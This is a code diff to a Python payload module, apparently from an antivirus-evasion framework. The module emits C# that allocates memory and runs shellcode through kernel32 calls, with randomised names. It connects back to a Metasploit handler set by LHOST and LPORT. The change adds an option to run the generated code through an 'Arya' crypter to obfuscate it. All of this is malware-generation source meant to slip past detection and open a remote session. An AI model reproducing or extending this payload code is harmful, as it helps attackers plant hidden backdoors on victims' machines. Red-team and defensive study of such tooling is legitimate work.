@@ -8,6 +8,7 @@ Module built by @harmj0y
 """
 
 from modules.common import helpers
+from modules.common import encryption
 
 class Payload:
     
@@ -19,9 +20,11 @@ class Payload:
         self.rating = "Excellent"
 
         # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"LHOST" : ["", "IP of the metasploit handler"],
-                                 "LPORT" : ["4444", "Port of the metasploit handler"],
-                                 "compile_to_exe" : ["Y", "Compile to an executable"]}
+        self.required_options = {"LHOST"            : ["", "IP of the metasploit handler"],
+                                 "LPORT"            : ["4444", "Port of the metasploit handler"],
+                                 "compile_to_exe"   : ["Y", "Compile to an executable"],
+                                 "use_arya"         : ["N", "Use the Arya crypter"]}
+        
         
         
     def generate(self):
@@ -86,5 +89,7 @@ class Payload:
         r = [helpers.randomString() for x in xrange(12)]
         payloadCode += """[DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 %s,UInt32 %s, UInt32 %s, UInt32 %s);\n[DllImport(\"kernel32\")]private static extern IntPtr CreateThread(UInt32 %s, UInt32 %s, UInt32 %s,IntPtr %s, UInt32 %s, ref UInt32 %s);\n[DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject(IntPtr %s, UInt32 %s); } }\n"""%(r[0],r[1],r[2],r[3],r[4],r[5],r[6],r[7],r[8],r[9],r[10],r[11])
 
+        if self.required_options["use_arya"][0].lower() == "y":
+            payloadCode = encryption.arya(payloadCode)
 
         return payloadCode
